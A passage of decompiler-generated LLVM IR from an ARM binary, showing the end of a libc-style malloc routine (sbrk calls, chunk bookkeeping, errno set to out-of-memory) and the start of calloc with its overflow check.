  %v2_29198 = add i32 %v4_29184, 872
  %v3_29198 = inttoptr i32 %v2_29198 to i32*
  %v4_29198 = load i32, i32* %v3_29198, align 4
  store i32 %v4_29198, i32* %r2.global-to-local, align 4
  %v1_2919c = load i32, i32* %r1.global-to-local, align 4
  %v2_2919c = load i32, i32* @r4, align 4
  %v3_2919c = sub i32 %v2_2919c, %v1_2919c
  %v3_291a0 = add i32 %v3_2919c, %v4_29198
  store i32 %v3_291a0, i32* %r3.global-to-local, align 4
  store i32 %v3_291a0, i32* %v3_29198, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_29194, %bb161
  %v0_291a8 = load i32, i32* @r4, align 4
  %v1_291a8 = urem i32 %v0_291a8, 8
  store i32 %v1_291a8, i32* %r3.global-to-local, align 4
  %v2_291a8 = icmp eq i32 %v1_291a8, 0
  br i1 %v2_291a8, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_291ac = sub nsw i32 8, %v1_291a8
  store i32 %v2_291ac, i32* %r3.global-to-local, align 4
  %v3_291b0 = add i32 %v2_291ac, %v0_291a8
  store i32 %v3_291b0, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_291b8 = phi i32 [ 0, %.thread43 ], [ %v2_291ac, %bb162 ]
  %v1_291b4 = load i32, i32* @r5, align 4
  %v2_291b4 = add i32 %v1_291b4, %v0_291a8
  store i32 %v2_291b4, i32* @r6, align 4
  %v1_291b8 = load i32, i32* @r8, align 4
  %v2_291b8 = add i32 %v2_291b4, %v0_291b8
  %v2_291bc = add i32 %v2_291b8, %v1_291b8
  store i32 %v2_291bc, i32* %r1.global-to-local, align 4
  %v1_291c0 = load i32, i32* %sb.global-to-local, align 4
  %v2_291c0 = add i32 %v1_291c0, %v2_291bc
  %v1_291c4 = load i32, i32* %fp.global-to-local, align 4
  %v2_291c4 = and i32 %v1_291c4, %v2_291c0
  store i32 %v2_291c4, i32* %r2.global-to-local, align 4
  %v2_291c8 = sub i32 0, %v2_291b4
  store i32 %v2_291c8, i32* %r3.global-to-local, align 4
  %v2_291cc = sub i32 %v2_291c4, %v2_291b4
  store i32 %v2_291cc, i32* @r5, align 4
  store i32 %v2_291cc, i32* %r0.global-to-local, align 4
  br i1 %v2_291a8, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_291a8, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_291d8 = call i32 @__GI_sbrk(i32 %v2_291cc)
  store i32 %v1_291d8, i32* %r0.global-to-local, align 4
  %v3_291dc = icmp eq i32 %v1_291d8, -1
  br i1 %v3_291dc, label %dec_label_pc_291e4, label %dec_label_pc_291f4

dec_label_pc_291e4:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_291e8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_291e8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_2924c

dec_label_pc_291f4:                               ; preds = %bb164
  %v1_291f4 = load i32, i32* @r4, align 4
  %v3_291f4 = icmp ult i32 %v1_291d8, %v1_291f4
  br i1 %v3_291f4, label %dec_label_pc_291fc, label %dec_label_pc_2924c

dec_label_pc_291fc:                               ; preds = %dec_label_pc_291f4
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r0.global-to-local, align 4
  %v4_29204 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_29204, i32* %r2.global-to-local, align 4
  %v1_29208 = add i32 %v4_29204, 864
  %v2_29208 = inttoptr i32 %v1_29208 to i32*
  %v3_29208 = load i32, i32* %v2_29208, align 4
  %v0_2920c = load i32, i32* @r6, align 4
  store i32 %v0_2920c, i32* %r0.global-to-local, align 4
  %v1_29210 = and i32 %v3_29208, -2
  store i32 %v1_29210, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_29210, i32* %v2_29208, align 4
  br label %dec_label_pc_2924c

dec_label_pc_29220:                               ; preds = %.thread40
  %v0_29220 = load i32, i32* %r0.global-to-local, align 4
  %v3_29220 = icmp eq i32 %v0_29220, -1
  br i1 %v3_29220, label %dec_label_pc_29228, label %dec_label_pc_29244

dec_label_pc_29228:                               ; preds = %dec_label_pc_29220
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_2922c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_2922c, i32* %r0.global-to-local, align 4
  %v0_29230 = load i32, i32* @r7, align 4
  %v1_29230 = add i32 %v0_29230, 872
  %v2_29230 = inttoptr i32 %v1_29230 to i32*
  %v3_29230 = load i32, i32* %v2_29230, align 4
  store i32 %v3_29230, i32* %r2.global-to-local, align 4
  %v0_29234 = load i32, i32* @r4, align 4
  %v0_29238 = load i32, i32* @r5, align 4
  %v2_29234 = add i32 %v3_29230, %v1_2922c
  %v2_29238 = sub i32 %v2_29234, %v0_29234
  %v2_2923c = sub i32 %v2_29238, %v0_29238
  store i32 %v2_2923c, i32* %r3.global-to-local, align 4
  store i32 %v2_2923c, i32* %v2_29230, align 4
  %v0_29248.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_29244

dec_label_pc_29244:                               ; preds = %dec_label_pc_29220, %dec_label_pc_29228
  %v0_29248 = phi i32 [ 0, %dec_label_pc_29220 ], [ %v0_29248.pre, %dec_label_pc_29228 ]
  %v0_29244 = load i32, i32* @r4, align 4
  store i32 %v0_29244, i32* @r7, align 4
  store i32 %v0_29248, i32* @r5, align 4
  br label %dec_label_pc_2924c

dec_label_pc_2924c:                               ; preds = %dec_label_pc_291f4, %dec_label_pc_291fc, %dec_label_pc_291e4, %dec_label_pc_29244
  %v0_2924c = load i32, i32* %r0.global-to-local, align 4
  %v7_2924c = icmp eq i32 %v0_2924c, -1
  br i1 %v7_2924c, label %dec_label_pc_292d0, label %dec_label_pc_29254

dec_label_pc_29254:                               ; preds = %dec_label_pc_2924c
  %v1_29254 = load i32, i32* @r5, align 4
  %v2_29254 = add i32 %v1_29254, %v0_2924c
  %v0_29258 = load i32, i32* @r7, align 4
  %v2_29258 = sub i32 %v2_29254, %v0_29258
  %v1_2925c = or i32 %v2_29258, 1
  %v2_29260 = add i32 %v0_29258, 4
  %v3_29260 = inttoptr i32 %v2_29260 to i32*
  store i32 %v1_2925c, i32* %v3_29260, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r1.global-to-local, align 4
  store i32 92, i32* %r3.global-to-local, align 4
  %v4_2926c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_2926c, i32* @r6, align 4
  %v1_29270 = add i32 %v4_2926c, 872
  %v2_29270 = inttoptr i32 %v1_29270 to i32*
  %v3_29270 = load i32, i32* %v2_29270, align 4
  %v0_29274 = load i32, i32* @r8, align 4
  %v2_29274 = icmp eq i32 %v0_29274, 0
  %v0_29278 = load i32, i32* @r5, align 4
  %v2_29278 = add i32 %v0_29278, %v3_29270
  store i32 %v2_29278, i32* %r3.global-to-local, align 4
  store i32 %v2_29278, i32* %v2_29270, align 4
  %v0_29280 = load i32, i32* @r7, align 4
  %v1_29280 = load i32, i32* @r6, align 4
  %v2_29280 = add i32 %v1_29280, 44
  %v3_29280 = inttoptr i32 %v2_29280 to i32*
  store i32 %v0_29280, i32* %v3_29280, align 4
  br i1 %v2_29274, label %dec_label_pc_292d0, label %dec_label_pc_29288

dec_label_pc_29288:                               ; preds = %dec_label_pc_29254
  %v0_2928c = load i32, i32* @r8, align 4
  %v1_2928c = add i32 %v0_2928c, -12
  %v1_29290 = and i32 %v1_2928c, -8
  store i32 %v3_29058, i32* %ip.global-to-local, align 4
  %v2_29298 = add i32 %v1_29290, %v3_29058
  store i32 %v2_29298, i32* %r1.global-to-local, align 4
  %v2_2929c = icmp ugt i32 %v1_29290, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_292a4 = or i32 %v1_29290, 1
  store i32 %v1_292a4, i32* %r3.global-to-local, align 4
  store i32 %v1_292a4, i32* %v2_29064, align 4
  %v0_292ac = load i32, i32* %r2.global-to-local, align 4
  %v1_292ac = load i32, i32* %r1.global-to-local, align 4
  %v2_292ac = add i32 %v1_292ac, 8
  %v3_292ac = inttoptr i32 %v2_292ac to i32*
  store i32 %v0_292ac, i32* %v3_292ac, align 4
  %v0_292b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_292b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_292b0 = add i32 %v1_292b0, 4
  %v3_292b0 = inttoptr i32 %v2_292b0 to i32*
  store i32 %v0_292b0, i32* %v3_292b0, align 4
  br i1 %v2_2929c, label %dec_label_pc_292b8, label %dec_label_pc_292d0

dec_label_pc_292b8:                               ; preds = %dec_label_pc_29288
  %v0_292b8 = load i32, i32* @r6, align 4
  %v1_292b8 = add i32 %v0_292b8, 836
  %v2_292b8 = inttoptr i32 %v1_292b8 to i32*
  %v3_292b8 = load i32, i32* %v2_292b8, align 4
  store i32 %v3_292b8, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_292c0 = load i32, i32* %ip.global-to-local, align 4
  %v1_292c0 = add i32 %v0_292c0, 8
  store i32 %v1_292c0, i32* @r0, align 4
  store i32 -1, i32* %v2_292b8, align 4
  %v0_292c8 = call i32 @free()
  store i32 %v0_292c8, i32* %r0.global-to-local, align 4
  %v0_292cc = load i32, i32* @r4, align 4
  %v1_292cc = load i32, i32* @r6, align 4
  %v2_292cc = add i32 %v1_292cc, 836
  %v3_292cc = inttoptr i32 %v2_292cc to i32*
  store i32 %v0_292cc, i32* %v3_292cc, align 4
  br label %dec_label_pc_292d0

dec_label_pc_292d0:                               ; preds = %.thread34, %dec_label_pc_29288, %dec_label_pc_29254, %dec_label_pc_2924c, %dec_label_pc_292b8
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r0.global-to-local, align 4
  %v4_292d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_292d8, i32* %lr.global-to-local, align 4
  %v1_292dc = add i32 %v4_292d8, 872
  store i32 %v1_292dc, i32* %r1.global-to-local, align 4
  %v1_292e0 = inttoptr i32 %v1_292dc to i32*
  %v2_292e0 = load i32, i32* %v1_292e0, align 4
  store i32 %v2_292e0, i32* %r1.global-to-local, align 4
  %v3_292e0 = add i32 %v4_292d8, 876
  %v4_292e0 = inttoptr i32 %v3_292e0 to i32*
  %v5_292e0 = load i32, i32* %v4_292e0, align 4
  store i32 %v5_292e0, i32* %r3.global-to-local, align 4
  %v1_292e8 = add i32 %v4_292d8, 868
  %v2_292e8 = inttoptr i32 %v1_292e8 to i32*
  %v3_292e8 = load i32, i32* %v2_292e8, align 4
  store i32 %v3_292e8, i32* %r3.global-to-local, align 4
  %v1_292ec = add i32 %v4_292d8, 884
  %v2_292ec = inttoptr i32 %v1_292ec to i32*
  %v3_292ec = load i32, i32* %v2_292ec, align 4
  store i32 %v3_292ec, i32* %r2.global-to-local, align 4
  %v2_292f0 = add i32 %v3_292e8, %v2_292e0
  store i32 %v2_292f0, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_292e0, %v5_292e0
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_292d0
  store i32 %v2_292e0, i32* %v4_292e0, align 4
  %v0_292f8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_292f8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_292d0, %bb165
  %v1_292f8 = phi i32 [ %v3_292ec, %dec_label_pc_292d0 ], [ %v1_292f8.pre, %bb165 ]
  %v4_292fc = phi i32 [ %v2_292f0, %dec_label_pc_292d0 ], [ %v0_292f8.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_292fc, %v1_292f8
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_292fc = load i32, i32* %lr.global-to-local, align 4
  %v6_292fc = add i32 %v5_292fc, 884
  %v7_292fc = inttoptr i32 %v6_292fc to i32*
  store i32 %v4_292fc, i32* %v7_292fc, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_29300 = load i32, i32* %lr.global-to-local, align 4
  %v1_29300 = add i32 %v0_29300, 44
  %v2_29300 = inttoptr i32 %v1_29300 to i32*
  %v3_29300 = load i32, i32* %v2_29300, align 4
  store i32 %v3_29300, i32* %ip.global-to-local, align 4
  %v1_29304 = add i32 %v3_29300, 4
  %v2_29304 = inttoptr i32 %v1_29304 to i32*
  %v3_29304 = load i32, i32* %v2_29304, align 4
  store i32 %v1_28f18, i32* %r1.global-to-local, align 4
  %v1_2930c = and i32 %v3_29304, -4
  store i32 %v1_2930c, i32* %r3.global-to-local, align 4
  %v3_29310 = icmp ult i32 %v1_2930c, %v1_28f18
  br i1 %v3_29310, label %dec_label_pc_2933c, label %dec_label_pc_29318

dec_label_pc_29318:                               ; preds = %bb168
  %v0_29318 = load i32, i32* @sl, align 4
  %v2_29318 = sub i32 %v1_2930c, %v0_29318
  %v2_2931c = add i32 %v0_29318, %v3_29300
  store i32 %v2_2931c, i32* %r1.global-to-local, align 4
  %v1_29320 = or i32 %v2_29318, 1
  store i32 %v1_29320, i32* %r3.global-to-local, align 4
  %v1_29324 = or i32 %v0_29318, 1
  store i32 %v1_29324, i32* %r2.global-to-local, align 4
  %v1_29328 = add i32 %v3_29300, 8
  store i32 %v1_29328, i32* %r0.global-to-local, align 4
  store i32 %v1_29324, i32* %v2_29304, align 4
  %v0_29330 = load i32, i32* %r1.global-to-local, align 4
  %v1_29330 = load i32, i32* %lr.global-to-local, align 4
  %v2_29330 = add i32 %v1_29330, 44
  %v3_29330 = inttoptr i32 %v2_29330 to i32*
  store i32 %v0_29330, i32* %v3_29330, align 4
  %v0_29334 = load i32, i32* %r3.global-to-local, align 4
  %v1_29334 = load i32, i32* %r1.global-to-local, align 4
  %v2_29334 = add i32 %v1_29334, 4
  %v3_29334 = inttoptr i32 %v2_29334 to i32*
  store i32 %v0_29334, i32* %v3_29334, align 4
  br label %dec_label_pc_2934c

dec_label_pc_2933c:                               ; preds = %bb157, %bb168, %dec_label_pc_29118
  %v0_2933c = call i32 @__GI___errno_location()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_29344 = inttoptr i32 %v0_2933c to i32*
  store i32 12, i32* %v2_29344, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2934c

dec_label_pc_2934c:                               ; preds = %bb151, %bb150, %dec_label_pc_28f60, %dec_label_pc_29318, %dec_label_pc_2933c
  %v0_2934c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2934c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_29350

dec_label_pc_29350:                               ; preds = %.thread1, %dec_label_pc_28f2c, %.thread121, %dec_label_pc_28d9c, %dec_label_pc_28d90, %dec_label_pc_28bf8, %dec_label_pc_28b7c, %dec_label_pc_2934c
  store i32 %v2_28aa4, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 76, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r2, align 4
  %v4_29360 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 76) to i32*), align 4
  store i32 %v4_29360, i32* @ip, align 4
  store i32 168812, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_29360)
  br label %dec_label_pc_2936c

dec_label_pc_2936c:                               ; preds = %dec_label_pc_28adc, %dec_label_pc_29350
  %v0_2936c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2936c, i32* %r0.global-to-local, align 4
  store i32 %v3_28a78, i32* @r4, align 4
  store i32 %v6_28a78, i32* @r5, align 4
  store i32 %v9_28a78, i32* @r6, align 4
  store i32 %v12_28a78, i32* @r7, align 4
  store i32 %v15_28a78, i32* @r8, align 4
  store i32 %v18_28a78, i32* @sb, align 4
  store i32 %v21_28a78, i32* @sl, align 4
  store i32 %v24_28a78, i32* @fp, align 4
  store i32 %v27_28a78, i32* @lr, align 4
  ret i32 %v0_2936c

; uselistorder directives
  uselistorder i32 %v0_29318, { 1, 0, 2 }
  uselistorder i32 %v3_29300, { 1, 0, 2, 3 }
  uselistorder i32 %v4_292fc, { 1, 0 }
  uselistorder i32 %v2_292e0, { 2, 0, 1, 3 }
  uselistorder i32 %v4_292d8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_29290, { 1, 2, 0 }
  uselistorder i32 %v0_29258, { 1, 0 }
  uselistorder i32 %v0_2924c, { 1, 0 }
  uselistorder i32 %v2_2923c, { 1, 0 }
  uselistorder i32 %v2_291cc, { 2, 1, 0 }
  uselistorder i32 %v2_291b4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_291ac, { 1, 0, 2 }
  uselistorder i32 %v1_291a8, { 2, 1, 0 }
  uselistorder i32 %v0_291a8, { 3, 1, 2, 0 }
  uselistorder i32 %v1_2918c, { 1, 0 }
  uselistorder i32 %v2_29164, { 1, 0 }
  uselistorder i32 %v3_29158, { 1, 0, 2 }
  uselistorder i32 %v2_29138, { 1, 0, 2 }
  uselistorder i32* %v2_29130, { 1, 0, 2 }
  uselistorder i32 %v0_29118, { 1, 0 }
  uselistorder i32 %v6_290f4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_290e0, { 2, 1, 0 }
  uselistorder i32 %v0_290c8, { 1, 0 }
  uselistorder i32 %v2_29084, { 1, 0, 2, 3 }
  uselistorder i32 %v1_29080, { 1, 0 }
  uselistorder i32 %v3_29058, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_29038, { 1, 0, 2 }
  uselistorder i32 %v2_29020, { 1, 2, 0, 3 }
  uselistorder i32 %v1_28fc8, { 2, 1, 0 }
  uselistorder i32 %v6_28fbc, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_28f98, { 2, 1, 0, 3 }
  uselistorder i32 %v3_28f58, { 1, 0, 2, 3 }
  uselistorder i32 %v0_28f18, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_28f10, { 1, 0, 2, 3 }
  uselistorder i32 %v4_28f0c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_28ef8, { 1, 0 }
  uselistorder i32 %v7_28eb8, { 1, 0 }
  uselistorder i32 %v4_28eb8, { 1, 0 }
  uselistorder i32 %v0_28e88, { 1, 0 }
  uselistorder i32 %v2_28e5c, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_28e5854, { 1, 0 }
  uselistorder i32 %v1_28e24, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_28e0c., { 1, 2, 0 }
  uselistorder i32 %v0_28e14, { 0, 1, 3, 2 }
  uselistorder i32 %v1_28e14, { 1, 0 }
  uselistorder i32 %v3_28df4, { 1, 0 }
  uselistorder i32 %v4_28df0, { 1, 0, 2 }
  uselistorder i32 %v1_28d60, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_28db8, { 1, 0 }
  uselistorder i32 %v1_28d9c, { 1, 0 }
  uselistorder i32 %v1_28c3c, { 1, 0 }
  uselistorder i32 %v0_28d7c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_28d44, { 2, 0, 1, 3 }
  uselistorder i32 %v0_28dd8.pre, { 1, 2, 0 }
  uselistorder i32 %v0_28d20, { 2, 1, 0 }
  uselistorder i32 %v3_28d14, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_28c34, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_28cdc, { 1, 0 }
  uselistorder i32 %v3_28cd0, { 1, 0 }
  uselistorder i32 %v0_28cdc, { 1, 0 }
  uselistorder i32 %v3_28cb4, { 0, 2, 3, 1 }
  uselistorder i32 %v2_28ca4, { 1, 0, 2 }
  uselistorder i32 %v3_28c5c, { 2, 1, 0 }
  uselistorder i32 %v0_28c4c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_28c1c, { 1, 0 }
  uselistorder i32 %v1_28bd0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_28bcc, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_28b70, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_28b64, { 1, 0 }
  uselistorder i32 %v3_28b34, { 1, 0 }
  uselistorder i32 %v0_28b28, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_28b08, { 0, 2, 1, 3 }
  uselistorder i1 %v7_28afc, { 1, 0 }
  uselistorder i32 %v0_28ad4, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 15, 16, 0, 1, 2, 3, 5, 4, 7, 8, 6, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 3, 4, 5, 6, 7, 11, 8, 9, 10, 12, 13, 14, 15, 0, 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 29, 25, 26, 27, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 49, 57, 44, 45, 46, 47, 48, 50, 51, 52, 53, 2, 54, 55, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76 }
  uselistorder i32* %r2.global-to-local, { 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 34, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, 39, 40 }
  uselistorder i32* %r1.global-to-local, { 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 30, 25, 26, 27, 28, 29, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %r0.global-to-local, { 40, 38, 41, 39, 42, 43, 44, 56, 48, 45, 57, 46, 47, 50, 49, 54, 51, 58, 53, 52, 59, 55, 2, 4, 3, 5, 7, 6, 9, 8, 13, 10, 11, 1, 12, 14, 15, 16, 17, 20, 21, 18, 19, 26, 23, 22, 24, 25, 27, 32, 28, 29, 30, 31, 34, 33, 37, 36, 35, 0 }
  uselistorder i32* %lr.global-to-local, { 9, 10, 11, 12, 13, 2, 0, 1, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %ip.global-to-local, { 36, 37, 38, 39, 40, 41, 42, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 29, 28, 21, 18, 1, 19, 20, 22, 23, 24, 25, 26, 27, 30, 31, 32, 33, 34, 35 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_2936c, { 1, 0 }
  uselistorder label %dec_label_pc_29350, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_2934c, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_2933c, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_292d0, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_2924c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_29244, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_29118, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_2904c, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_28f04, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_28e58, { 1, 0 }
  uselistorder label %dec_label_pc_28e60.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_28e24, { 1, 0 }
  uselistorder label %dec_label_pc_28dd8, { 1, 0 }
  uselistorder label %dec_label_pc_28d6c, { 1, 0 }
  uselistorder label %dec_label_pc_28d68, { 1, 0 }
  uselistorder label %dec_label_pc_28d14, { 1, 0 }
  uselistorder label %dec_label_pc_28d00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_28cc8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_28cb4, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_29380(i32 %arg1) local_unnamed_addr {
dec_label_pc_29380:
  %v0_29380 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_29380, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_29380
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_29380, %bb
  %v4_29394 = phi i32 [ %arg1, %dec_label_pc_29380 ], [ 0, %bb ]
  ret i32 %v4_29394

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_29398 = load i32, i32* @r4, align 4
  %v6_29398 = load i32, i32* @r5, align 4
  %v9_29398 = load i32, i32* @r6, align 4
  %v12_29398 = load i32, i32* @lr, align 4
  %v2_293a0 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_293b0 = mul i32 %arg2, %arg1
  store i32 %v2_293b0, i32* @r6, align 4
  br i1 %v2_293a0, label %dec_label_pc_293e0, label %dec_label_pc_293b8

dec_label_pc_293b8:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_293c0 = udiv i32 %v2_293b0, %arg1
  %v9_293c4 = icmp eq i32 %v2_293c0, %arg2
  br i1 %v9_293c4, label %dec_label_pc_293e0, label %dec_label_pc_293cc

dec_label_pc_293cc:                               ; preds = %dec_label_pc_293b8
  %v0_293cc = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_293d8 = inttoptr i32 %v0_293cc to i32*
  store i32 12, i32* %v2_293d8, align 4
  br label %dec_label_pc_294a4

dec_label_pc_293e0:                               ; preds = %dec_label_pc_293b8, %entry
  %v4_293e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 156) to i32*), align 4
  store i32 %v4_293e4, i32* @r4, align 4
  %v4_293fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  store i32 %v4_293fc, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_293fc)
  %v0_29410 = load i32, i32* @r5, align 4
  %v2_29410 = add i32 %v0_29410, 36
  %v3_29410 = inttoptr i32 %v2_29410 to i32*
  %v4_29410 = load i32, i32* %v3_29410, align 4
  store i32 %v4_29410, i32* %ip.global-to-local, align 4
  store i32 168988, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_29410)
  %v0_2941c = load i32, i32* @r6, align 4
  %v1_29420 = call i32 @malloc(i32 %v0_2941c)
  store i32 %v1_29420, i32* @r0, align 4
  store i32 %v1_29420, i32* %r4.global-to-local, align 4
  %v2_29424 = icmp eq i32 %v1_29420, 0
  br i1 %v2_29424, label %.thread, label %dec_label_pc_2942c

dec_label_pc_2942c:                               ; preds = %dec_label_pc_293e0
  %v1_2942c = add i32 %v1_29420, -4
  %v2_2942c = inttoptr i32 %v1_2942c to i32*
  %v3_2942c = load i32, i32* %v2_2942c, align 4
  %v1_29430 = and i32 %v3_2942c, 2
  store i32 %v1_29430, i32* @r1, align 4
  %v2_29430 = icmp eq i32 %v1_29430, 0
  br i1 %v2_29430, label %dec_label_pc_29438, label %.thread

dec_label_pc_29438:                               ; preds = %dec_label_pc_2942c
  %v1_294386 = add i32 %v3_2942c, -4
  %v1_2943c = and i32 %v1_294386, -4
  store i32 %v1_2943c, i32* @r2, align 4
  %v3_29440 = udiv i32 %v1_2943c, 4
  store i32 %v3_29440, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_2943c, 36
  %v2_29448 = icmp ult i32 %v1_2943c, 33
  %v3_29448 = or i1 %tmp, %v2_29448
  br i1 %v3_29448, label %dec_label_pc_29454, label %dec_label_pc_2944c

dec_label_pc_2944c:                               ; preds = %dec_label_pc_29438
